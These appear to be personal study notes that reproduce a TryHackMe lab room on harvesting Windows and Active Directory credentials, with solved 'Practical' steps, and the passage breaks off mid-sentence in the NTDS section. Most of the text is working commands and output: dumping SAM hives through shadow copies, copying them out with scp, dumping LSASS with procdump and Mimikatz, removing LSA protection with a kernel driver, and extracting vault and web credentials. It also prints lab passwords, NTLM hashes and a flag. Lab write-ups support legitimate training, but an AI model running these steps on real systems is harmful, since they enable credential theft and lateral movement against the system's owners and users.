# Introduction

---

## Welcome to Credentials Harvesting

This room discusses the fundamental knowledge for red teamers taking advantage of obtained credentials to perform Lateral Movement and access resources within the AD environment. We will be showing how to obtain, reuse, and impersonate user credentials. Credential harvesting consists of techniques for obtaining credentials like login information, account names, and passwords. It is a technique of extracting credential information from a system in various locations such as clear-text files, registry, memory dumping, etc. As a red teamer, gaining access to legitimate credentials has benefits:

- It can give access to systems (Lateral Movement).
- It makes it harder to detect our actions.
- It provides the opportunity to create and manage accounts to help achieve the end goals of a red team engagement.

## Learning Objectives

- Understand the method of extracting credentials from local windows (SAM database)
- Learn how to access Windows memory and dump clear-text passwords and authentication tickets locally and remotely.
- Introduction to Windows Credentials Manager and how to extract credentials.
- Learn methods of extracting credentials for Domain Controller
- Enumerate the Local Administrator Password Solution (LAPS) feature.
- Introduction to AD attacks that lead to obtaining credentials.

## Room Prerequisites

We strongly suggest finishing the following Active Directory rooms before diving into this room:

- [Jr. Penetration Tester Path](https://tryhackme.com/path-action/jrpenetrationtester/join)
- [Active Directory Basics](https://tryhackme.com/r/room/winadbasics)
- [Breaching AD](https://tryhackme.com/room/breachingad)
- [Enumerating AD](https://tryhackme.com/room/adenumeration)
- [Lateral Movement and Pivoting](https://tryhackme.com/room/lateralmovementandpivoting)


# Credentials Harvesting

---

Credentials Harvesting is a term for gaining access to user and system credentials. It is a technique to look for or steal stored credentials, including network sniffing, where an attacker captures transmitted credentials. Credentials can be found in a variety of different forms, such as:

- Accounts details (usernames and passwords)
- Hashes that include NTLM hashes, etc.
- Authentication Tickets: Tickets Granting Ticket (TGT), Ticket Granting Server (TGS) 
- Any information that helps login into a system (private keys, etc.)

Generally speaking, there are two types of credential harvesting: external and internal. External credential harvesting most likely involves phishing emails and other techniques to trick a user into entering his username and password. If you want to learn more about phishing emails, we suggest trying the THM [Phishing](https://tryhackme.com/room/phishingyl) room. Obtaining credentials through the internal network uses different approaches.

In this room, the focus will be on harvesting credentials from an internal perspective where a threat actor has already compromised a system and gained initial access. We have provided a Windows Server 2019 configured as a Domain Controller. To follow the content discussed in this room, deploy the machine and move on to the next task.

You can access the machine in-browser or through RDP using the credentials below.

Machine IP: MACHINE_IP Username: thm Password: Passw0rd! Ensure to deploy the AttackBox as it is required in attacks discussed in this room.

# Credential Access

---

Credential access is where adversaries may find credentials in compromised systems and gain access to user credentials. It helps adversaries to reuse them or impersonate the identity of a user. This is an important step for lateral movement and accessing other resources such as other applications or systems. Obtaining legitimate user credentials is preferred rather than exploiting systems using CVEs.

For more information, you may visit the MITRE ATT&CK framework ([TA0006](https://attack.mitre.org/tactics/TA0006/)).

Credentials are stored insecurely in various locations in systems:

- Clear-text files
- Database files
- Memory
- Password managers
- Enterprise Vaults
- Active Directory
- Network Sniffing

Let's discuss them a bit more!

## Clear-text files

Attackers may search a compromised machine for credentials in local or remote file systems. Clear-text files could include sensitive information created by a user, containing passwords, private keys, etc. The MITRE ATT&CK framework defines it as **Unsecured Credentials: Credentials In Files** ([T1552.001](https://attack.mitre.org/techniques/T1552/001/)).

The following are some of the types of clear-text files that an attacker may be interested in:

- Commands history
- Configuration files (Web App, FTP files, etc.)
- Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
- Backup files
- Shared files and folders
- Registry
- Source code As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path:`C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

It might be worth checking what users are working on or finding sensitive information. Another example would be finding interesting information. For example, the following command is to look for the "password" keyword in the Window registry.

Searching for the "password" keyword in the Registry

```shell-session
c:\Users\user> reg query HKLM /f password /t REG_SZ /s
#OR
C:\Users\user> reg query HKCU /f password /t REG_SZ /s
```

## Database Files

Applications utilize database files to read or write settings, configurations, or credentials. Database files are usually stored locally in Windows operating systems. These files are an excellent target to check and hunt for credentials. For more information, we suggest checking THM room: [Breaching AD](https://tryhackme.com/room/breachingad). It contains a showcase example of extracting credentials from the local McAfee Endpoint database file.

## Password Managers

A password manager is an application to store and manage users' login information for local and Internet websites and services. Since it deals with users' data, it must be stored securely to prevent unauthorized access. Examples of Password Manager applications:

- Built-in password managers (Windows)
- Third-party: KeePass, 1Password, LastPass

However, misconfiguration and security flaws are found in these applications that let adversaries access stored data. Various tools could be used during the enumeration stage to get sensitive data in password manager applications used by Internet browsers and desktop applications. This room will discuss how to access the Windows Credentials manager and extract passwords.

## Memory Dump

The Operating system's memory is a rich source of sensitive information that belongs to the Windows OS, users, and other applications. Data gets loaded into memory at run time or during the execution. Thus, accessing memory is limited to administrator users who fully control the system.

The following are examples of memory stored sensitive data, including:

- Clear-text credentials
- Cached passwords
- AD Tickets

In this room, we will discuss how to get access to memory and extract clear-text passwords and authentication tickets.

## Active Directory

Active Directory stores a lot of information related to users, groups, computers, etc. Thus, enumerating the Active Directory environment is one of the focuses of red team assessments. Active Directory has a solid design, but misconfiguration made by admins makes it vulnerable to various attacks shown in this room.

The following are some of the Active Directory misconfigurations that may leak users' credentials.

- **Users' description**: Administrators set a password in the description for new employees and leave it there, which makes the account vulnerable to unauthorized access. - **Group Policy SYSVOL**: Leaked encryption keys let attackers access administrator accounts. Check Task 8 for more information about the vulnerable version of SYSVOL.
- **NTDS:** Contains AD users' credentials, making it a target for attackers.
- **AD Attacks:** Misconfiguration makes AD vulnerable to various attacks, which we will discuss in Task 9.

## Network Sniffing

Gaining initial access to a target network enables attackers to perform various network attacks against local computers, including the AD environment. The Man-In-the-Middle attack against network protocols lets the attacker create a rogue or spoof trusted resources within the network to steal authentication information such as NTLM hashes.

## Practical

---

We need to answer this:

![Pasted image 20250528122048.png](../../../IMAGES/Pasted%20image%2020250528122048.png)

Let's use this on cmd:

```cmd
reg query HKLM /f flag /t REG_SZ /s
```

We can see this:

![Pasted image 20250528122111.png](../../../IMAGES/Pasted%20image%2020250528122111.png)

We got the password:

```
7tyh4ckm3
```

Now, to enumerate the AD environment, we can use powershell:

```powershell
powershell -ep bypass
Import-Module ActiveDirectory
Get-ADUser -Filter * -Properties * | Select-Object DistinguishedName, SamAccountName, Description
```

We can see this:

![Pasted image 20250528122215.png](../../../IMAGES/Pasted%20image%2020250528122215.png)

We got the password:

```
Passw0rd!@#
```

# Local Windows Credentials

---

In general, Windows operating system provides two types of user accounts: Local and Domain. Local users' details are stored locally within the Windows file system, while domain users' details are stored in the centralized Active Directory. This task discusses credentials for local user accounts and demonstrates how they can be obtained. 

## Keystrokes

Keylogger is a software or hardware device to monitor and log keyboard typing activities. Keyloggers were initially designed for legitimate purposes such as feedback for software development or parental control. However, they can be misused to steal data. As a red teamer, hunting for credentials through keyloggers in a busy and interactive environment is a good option. If we know a compromised target has a logged-in user, we can perform keylogging using tools like the Metasploit framework or others.

We have a use case example for exploiting users via keystrokes using Metasploit in another THM room. For more information, you should check THM [Exploiting AD](https://tryhackme.com/room/exploitingad) (Task 5). Security Account Manager (SAM)

The SAM is a Microsoft Windows database that contains local account information such as usernames and passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. Moreover, it can not be read and accessed by any users while the Windows operating system is running. However, there are various ways and attacks to dump the content of the SAM database. First, ensure you have deployed the provided VM and then confirm we are not able to copy or read the`c:\Windows\System32\config\sam` file

```shell-session
C:\Windows\system32>type c:\Windows\System32\config\sam
type c:\Windows\System32\config\sam
The process cannot access the file because it is being used by another process.

C:\Windows\System32> copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\ 
copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\
The process cannot access the file because it is being used by another process.
 0 file(s) copied.
```


## Metasploit's HashDump

The first method is using the built-in Metasploit Framework feature, hashdump, to get a copy of the content of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump copy hashes. For more information about hashdump, you can visit the [rapid7](https://www.rapid7.com/blog/post/2010/01/01/safe-reliable-hash-dumping/) blog. We will discuss dumping credentials directly from the LSASS.exe process in another task!

```shell-session
meterpreter > getuid
Server username: THM\Administrator
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3b784d80d18385cea5ab3aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:443e64439a4b7fe780db47fc06a3342d:::
```

## Volume Shadow Copy Service

The other approach uses the Microsoft Volume shadow copy service, which helps perform a volume backup while applications read/write on volumes. You can visit the [Microsoft documentation page](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) for more information about the service.

More specifically, we will be using wmic to create a shadow volume copy. This has to be done through the command prompt with **administrator privileges** as follows,

1. Run the standard cmd.exe prompt with administrator privileges.
2. Execute the wmic command to create a copy shadow of C: drive
3. Verify the creation from step 2 is available.
4. Copy the SAM database from the volume we created in step 2

Now let's apply what we discussed above and run the cmd.exe with administrator privileges. Then execute the following wmic command:

```shell-session
C:\Users\Administrator>wmic shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
 ReturnValue = 0;
 ShadowID = "{D8A11619-474F-40AE-A5A0-C2FAA1D78B85}";
};
```

Once the command is successfully executed, let's use the `vssadmin`, Volume Shadow Copy Service administrative command-line tool, to list and confirm that we have a shadow copy of the `C:` volume.

```shell-session
C:\Users\Administrator>vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {0c404084-8ace-4cb8-a7ed-7d7ec659bb5f}
 Contained 1 shadow copies at creation time: 5/31/2022 1:45:05 PM
 Shadow Copy ID: {d8a11619-474f-40ae-a5a0-c2faa1d78b85}
 Original Volume: (C:)\\?\Volume{19127295-0000-0000-0000-100000000000}\
 Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
 Originating Machine: Creds-Harvesting-AD.thm.red
 Service Machine: Creds-Harvesting-AD.thm.red
 Provider: 'Microsoft Software Shadow Copy provider 1.0'
 Type: ClientAccessible
 Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
```

The output shows that we have successfully created a shadow copy volume of (C:) with the following path: `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`. As mentioned previously, the SAM database is encrypted either with [RC4](https://en.wikipedia.org/wiki/RC4) or [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) encryption algorithms. In order to decrypt it, we need a decryption key which is also stored in the files system in `c:\Windows\System32\Config\system`. Now let's copy both files (sam and system) from the shadow copy volume we generated to the desktop as follows,

```shell-session
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
 1 file(s) copied.

C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
 1 file(s) copied.
```

Now we have both required files, transfer them to the AttackBox with your favourite method (SCP should work). ## Registry Hives

Another possible method for dumping the SAM database content is through the Windows Registry. Windows registry also stores a copy of some of the SAM database contents to be used by Windows services. Luckily, we can save the value of the Windows registry using the reg.exe tool. As previously mentioned, we need two files to decrypt the SAM database's content. Ensure you run the command prompt with Administrator privileges.

```shell-session
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>
```

Let's this time decrypt it using one of the Impacket tools:`secretsdump.py`, which is already installed in the AttackBox. The Impacket SecretsDump script extracts credentials from a system locally and remotely using different techniques.

Move both SAM and system files to the AttackBox and run the following command:

```shell-session
python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

Note that we used the SAM and System files that we extracted from Windows Registry. The `-sam` argument is to specify the path for the dumped sam file from the Windows machine. The `-system` argument is for a path for the system file. We used the `LOCAL` argument at the end of the command to decrypt the Local SAM file as this tool handles other types of decryption. Note if we compare the output against the NTLM hashes we got from Metasploit's Hashdump, the result is different. The reason is the other accounts belong to Active Directory, and their information is **not** stored in the System file we have dumped. To Decrypt them, we need to dump the SECURITY file from the Windows file, which contains the required files to decrypt Active Directory accounts.

Once we obtain NTLM hashes, we can try to crack them using Hashcat if they are guessable, or we can use different techniques to impersonate users using the hashes.

## Practical

---

To begin with, we need to copy the `SAM` and `SYSTEM` files, let's use `wmic` for this, first, we need to open cmd as administrator, once open, do:

```shell-session
wmic shadowcopy call create Volume='C:\'
```

![Pasted image 20250528122934.png](../../../IMAGES/Pasted%20image%2020250528122934.png)

We can now use `vssadmin` to confirm that we have a shadow copy of the `C:\` volume:

```shell-session
vssadmin list shadows
```

![Pasted image 20250528123044.png](../../../IMAGES/Pasted%20image%2020250528123044.png)

As seen, the shadow copy was successfully created, the route for this is:

```
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

Let's copy both the `SAM` and `SYSTEM` files:

```shell-session
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
```

![Pasted image 20250528123246.png](../../../IMAGES/Pasted%20image%2020250528123246.png)

As seen, we got both files on the administrator's desktop, let's transfer them using scp, first, make sure ssh is enabled and running on your linux machine, then inside of windows do:


```
scp C:\Users\Administrator\Desktop\sam user@IP:/home/user
scp C:\Users\Administrator\Desktop\system user@IP:/home/user
```

Once the files transfered, we need to use `secretsdump`:

```
python3 secretsdump.py -sam sam -system system LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

We got our hash:

```
98d3a787a80d08385cea7fb4aa2a4261
```

![Pasted image 20250528124855.png](../../../IMAGES/Pasted%20image%2020250528124855.png)



# Local Security Authority Subsystem Service (LSASS).

---

## What is the LSASS?

Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system security policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes, and Kerberos tickets. Windows system stores credentials in the LSASS process to enable users to access network resources, such as file shares, SharePoint sites, and other network services, without entering credentials every time a user connects.

Thus, the LSASS process is a juicy target for red teamers because it stores sensitive information about user accounts. The LSASS is commonly abused to dump credentials to either escalate privileges, steal data, or move laterally. Luckily for us, if we have administrator privileges, we can dump the process memory of LSASS. Windows system allows us to create a dump file, a snapshot of a given process. This could be done either with the Desktop access (GUI) or the command prompt. This attack is defined in the MITRE ATT&CK framework as "[OS Credential Dumping: LSASS Memory (T1003)](https://attack.mitre.org/techniques/T1003/001/)".

## Graphic User Interface (GUI) 

To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select "Create dump file".

![Dumping lsass.exe process Using Task Manager](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/1af2123f694b7386364b53ae6259b8de.png)

Once the dumping process is finished, a pop-up message will show containing the path of the dumped file. Now copy the file and transfer it to the AttackBox to extract NTLM hashes offline.

**Note:** if we try this on the provided VM, you should get an error the first time this is run, until we fix the registry value in the **Protected LSASS** section later in this task.

Copy the dumped process to the Mimikatz folder.

```markup
C:\Users\Administrator>copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
 1 file(s) copied.
```

## Sysinternals Suite

An alternative way to dump a process if a GUI is not available to us is by using ProcDump. ProcDump is a Sysinternals process dump utility that runs from the command prompt. The SysInternals Suite is already installed in the provided machine at the following path: `c:\Tools\SysinternalsSuite` We can specify a running process, which in our case is lsass.exe, to be dumped as follows,

```markup
c:\>c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[09:09:33] Dump 1 initiated: c:\Tools\Mimikatz\lsass_dump-1.dmp
[09:09:33] Dump 1 writing: Estimated dump file size is 162 MB.
[09:09:34] Dump 1 complete: 163 MB written in 0.4 seconds
[09:09:34] Dump count reached.
```

Note that the dump process is writing to disk. Dumping the LSASS process is a known technique used by adversaries. Thus, AV products may flag it as malicious. In the real world, you may be more creative and write code to encrypt or implement a method to bypass AV products. 

## MimiKatz

[Mimikatz](https://github.com/gentilkiwi/mimikatz) is a well-known tool used for extracting passwords, hashes, PINs, and Kerberos tickets from memory using various techniques. Mimikatz is a post-exploitation tool that enables other useful attacks, such as pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets. Mimikatz deals with operating system memory to access information. Thus, it requires administrator and system privileges in order to dump memory and extract credentials.

We will be using the`Mimikatz` tool to extract the memory dump of the lsass.exe process. We have provided the necessary tools for you, and they can be found at: `c:\Tools\Mimikatz`.

Remember that the LSASS process is running as a SYSTEM. Thus in order to access users' hashes, we need a system or local administrator permissions. Thus, open the command prompt and run it as administrator. Then, execute the mimikatz binary as follows,

```markup
C:\Tools\Mimikatz> mimikatz.exe

 .#####. mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43
 .## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ## > http://blog.gentilkiwi.com/mimikatz
 '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )
 '#####' > http://pingcastle.com / http://mysmartlogon.com ***/

mimikatz # 
```

Before dumping the memory for cashed credentials and hashes, we need to enable the SeDebugPrivilege and check the current permissions for memory access. It can be done by executing`privilege::debug` command as follows,

```markup
mimikatz # privilege::debug
Privilege '20' OK
```

Once the privileges are given, we can access the memory to dump all cached passwords and hashes from the `lsass.exe` process using `sekurlsa::logonpasswords`. If we try this on the provided VM, it will not work until we fix it in the next section.

```markup
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 515377 (00000000:0007dd31)
Session : RemoteInteractive from 3
User Name : Administrator
Domain : THM
Logon Server : CREDS-HARVESTIN
Logon Time : 6/3/2022 8:30:44 AM
SID : S-1-5-21-1966530601-3185510712-10604624-500
 msv :
 [00000003] Primary
 * Username : Administrator
 * Domain : THM
 * NTLM : 98d3a787a80d08385cea7fb4aa2a4261
 * SHA1 : 64a137cb8178b7700e6cffa387f4240043192e72
 * DPAPI : bc355c6ce366fdd4fd91b54260f9cf70
...
```

Mimikatz lists a lot of information about accounts and machines. If we check closely in the Primary section for Administrator users, we can see that we have an NTLM hash. **Note** to get users' hashes, a user (victim) must have logged in to a system, and the user's credentials have been cached.

## Protected LSASS

In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory. This task will show how to disable the LSA protection and dump credentials from memory using Mimikatz. To enable LSASS protection, we can modify the registry RunAsPPL DWORD value in`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` to 1.

The steps are similar to the previous section, which runs the Mimikatz execution file with admin privileges and enables the debug mode. If the LSA protection is enabled, we will get an error executing the "sekurlsa::logonpasswords" command.

```markup
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

The command returns a 0x00000005 error code message (Access Denied). Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing "!+" as follows,

```markup
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
```

Note: If this fails with an `isFileExist` error, exit mimikatz, navigate to `C:\Tools\Mimikatz\` and run the command again. 
 
Once the driver is loaded, we can disable the LSA protection by executing the following Mimikatz command:


```markup
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 528 -> 00/00 [0-0-0]
```

Now, if we try to run the "sekurlsa::logonpasswords" command again, it must be executed successfully and show cached credentials in memory.



## Practical

---

![Pasted image 20250528125256.png](../../../IMAGES/Pasted%20image%2020250528125256.png)

As seen, `LSASS` protection is enabled, we need to disable it:

![Pasted image 20250528125338.png](../../../IMAGES/Pasted%20image%2020250528125338.png)

```markup
!processprotect /process:lsass.exe /remove
```

![Pasted image 20250528125353.png](../../../IMAGES/Pasted%20image%2020250528125353.png)


We can now use the command again:

```
sekurlsa::logonpasswords
```

![Pasted image 20250528125446.png](../../../IMAGES/Pasted%20image%2020250528125446.png)

![Pasted image 20250528125454.png](../../../IMAGES/Pasted%20image%2020250528125454.png)


# Windows Credential Manager

---

This task introduces the Windows Credential Manager and discusses the technique used for dumping system credentials by exploiting it.

## What is Credentials Manager?

Credential Manager is a Windows feature that stores logon-sensitive information for websites, applications, and networks. It contains login credentials such as usernames, passwords, and internet addresses. There are four credential categories:

- Web credentials contain authentication details stored in Internet browsers or other applications.
- Windows credentials contain Windows authentication details, such as NTLM or Kerberos.
- Generic credentials contain basic authentication details, such as clear-text usernames and passwords.
- Certificate-based credentials: These are authentication details based on certificates.

Note that authentication details are stored on the user's folder and are not shared among Windows user accounts. However, they are cached in memory.

## Accessing Credential Manager 

We can access the Windows Credential Manager through GUI (Control Panel -> User Accounts -> Credential Manager) or the command prompt. In this task, the focus will be more on the command prompt scenario where the GUI is not available.

![Windows Credential Manager](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2ee895dc640303b236e795c1f7e5df7a.png) 

We will be using the Microsoft Credentials Manager`vaultcmd` utility. Let's start to enumerate if there are any stored credentials. First, we list the current windows vaults available in the Windows target.

```markup
C:\Users\Administrator>vaultcmd /list
Currently loaded vaults:
 Vault: Web Credentials
 Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
 Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

 Vault: Windows Credentials
 Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
 Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault
```

By default, Windows has two vaults, one for Web and the other one for Windows machine credentials. The above output confirms that we have the two default vaults.

Let's check if there are any stored credentials in the Web Credentials vault by running the vaultcmd command with `/listproperties`.

```markup
C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"
Vault Properties: Web Credentials
Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
Number of credentials: 1
Current protection method: DPAPI
```

The output shows that we have one stored credential in the specified vault. Now let's try to list more information about the stored credential as follows,

```markup
C:\Users\Administrator>VaultCmd /listcreds:"Web Credentials"
Credentials in vault: Web Credentials

Credential schema: Windows Web Password Credential
Resource: internal-app.thm.red
Identity: THMUser Saved By: MSEdge
Hidden: No
Roaming: Yes
```

## Credential Dumping 

The VaultCmd is not able to show the password, but we can rely on other PowerShell Scripts such as [Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1), which is already included in the attached VM.

Ensure to execute PowerShell with bypass policy to import it as a module as follows,

```markup
C:\Users\Administrator>powershell -ex bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> Import-Module C:\Tools\Get-WebCredentials.ps1
PS C:\Users\Administrator> Get-WebCredentials

UserName Resource Password Properties
-------- -------- -------- ----------
THMUser internal-app.thm.red Password! {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]}
```

The output shows that we obtained the username and password for accessing the internal application.

## RunAs

An alternative method of taking advantage of stored credentials is by using RunAs. RunAs is a command-line built-in tool that allows running Windows applications or tools under different users' permissions. The RunAs tool has various command arguments that could be used in the Windows system. The `/savecred` argument allows you to save the credentials of the user in Windows Credentials Manager (under the Windows Credentials section). So, the next time we execute as the same user, runas will not ask for a password.

Let's apply it to the attached Windows machine. Another way to enumerate stored credentials is by using `cmdkey`, which is a tool to create, delete, and display stored Windows credentials. By providing the `/list` argument, we can show all stored credentials, or we can specify the credential to display more details `/list:computername`.

```markup
C:\Users\thm>cmdkey /list

Currently stored credentials:

 Target: Domain:interactive=thm\thm-local
 Type: Domain Password
 User: thm\thm-local
```

The output shows that we have a domain password stored as the `thm\thm-local` user. Note that stored credentials could be for other servers too. Now let's use runas to execute Windows applications as the `thm-local` user.

```markup
C:\Users\thm>runas /savecred /user:THM.red\thm-local cmd.exe
Attempting to start cmd.exe as user "THM.red\thm-local" ...
```

A new cmd.exe pops up with a command prompt ready to use. Now run the whoami command to confirm that we are running under the desired user. There is a flag in the `c:\Users\thm-local\Saved Games\flag.txt`, try to read it and answer the question below.

## Mimikatz

Mimikatz is a tool that can dump clear-text passwords stored in the Credential Manager from memory. The steps are similar to those shown in the previous section (Memory dump), but we can specify to show the credentials manager section only this time.

```markup
C:\Users\Administrator>c:\Tools\Mimikatz\mimikatz.exe

 .#####. mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ## > http://blog.gentilkiwi.com/mimikatz
 '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )
 '#####' > http://pingcastle.com / http://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman
```

Apply this technique to the attached machine and answer the question below.

The techniques discussed in this task also could be done through other tools such as Empire, Metasploit, etc. You can do your own research to expand your knowledge.


## Practical

---

We need to answer:

![Pasted image 20250528125847.png](../../../IMAGES/Pasted%20image%2020250528125847.png)

In order to speed up the process, we can use powershell:

```powershell
vaultcmd /list 
vaultcmd /listproperties:"Web Credentials" 
vaultcmd /listcreds:"Web Credentials" 
Import-Module C:\Tools\Get-WebCredentials.ps1
Get-WebCredentials
```

![Pasted image 20250528130038.png](../../../IMAGES/Pasted%20image%2020250528130038.png)

As seen, using the module, we can get the password pretty easily, we got:

```
E4syPassw0rd
```

We now need to use mimikatz, let's do:

```
c:\Tools\Mimikatz\mimikatz.exe

privilege::debug
sekurlsa::credman
```

We can see the `SMB` share:

![Pasted image 20250528130223.png](../../../IMAGES/Pasted%20image%2020250528130223.png)

Got our password:

```
jfxKruLkkxoPjwe3
```

For the last question, we can use mimikatz again to find the credentials for `thm-local`, we can use the technique on the task but we can do this too:

```
vault::cred /patch
```

![Pasted image 20250528130427.png](../../../IMAGES/Pasted%20image%2020250528130427.png)

As seen, we got the password for the user, we can now run PowerShell as `thm-local`:

```
runas /user:thm-local powershell
```

![Pasted image 20250528130555.png](../../../IMAGES/Pasted%20image%2020250528130555.png)

As seen, we got a shell as `thm-local`, let's get our flag:

```
PS C:\Windows\system32> type "c:\Users\thm-local\Saved Games\flag.txt" THM{RunA5S4veCr3ds}
```


# Domain Controller

----

This task discusses the required steps to dump Domain Controller Hashes locally and remotely.

## NTDS Domain Controller

New Technologies Directory Services (NTDS) is a database containing all Active Directory data, including objects, attributes, credentials, etc. The NTDS.DTS data consists of three tables as follows:

- Schema table: it contains types of objects and their relationships.
- Link table: it contains the object's attributes and their values.
- Data type: It contains users and groups.

NTDS is located in `C:\Windows\NTDS` by default, and it is encrypted to prevent data extraction from a target machine. Accessing the NTDS.dit file from the machine running is disallowed since the file is used by Active Directory and is locked. However, there are various ways to gain access to it. This task will discuss how to get a copy of the NTDS file using the ntdsutil and Diskshadow tool and finally how to dump the file's content. It is important to note that decrypting the NTDS file requires a system Boot Key to attempt to decrypt LSA Isolated credentials, which is stored in the `SECURITY` file system. Therefore, we must also dump the security file containing all required files to decrypt. ## Ntdsutil 

Ntdsutil is a Windows utility to used manage and maintain Active Directory configurations. It can be used in various scenarios such as - Restore deleted objects in Active Directory.
- Perform maintenance for the AD database.
- Active Directory snapshot management.
- Set Directory Services Restore Mode (DSRM) administrator passwords.

For more information about Ntdsutil, you may visit the Microsoft documentation [page](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343\(v=ws.11\)).

Local Dumping (No Credentials)

This is usually done if you have no credentials available but have administrator access to the domain controller. Therefore, we will be relying on Windows utilities to dump the NTDS file and crack them offline. As a requirement, first, we assume we have administrator access to a domain controller. To successfully dump the content of the NTDS file we need the following files:

